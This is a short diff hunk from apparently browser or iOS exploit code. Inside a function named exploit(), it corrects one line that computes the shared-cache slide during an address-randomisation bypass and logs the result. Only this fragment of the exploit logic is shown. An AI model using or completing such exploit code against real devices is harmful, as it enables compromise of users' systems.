@@ -614,7 +614,7 @@ function exploit(){
         } else {
         fail("base_seg");
     }
-        var cache_slide = Sub(dcache_base, dcache_base_seg.addr);
+        var cache_slide = Sub(dcache_base, seg.addr);
         log("cache_slide =" + cache_slide);
         for(var i = 0; i < dcache_segs.length; ++i)
         {
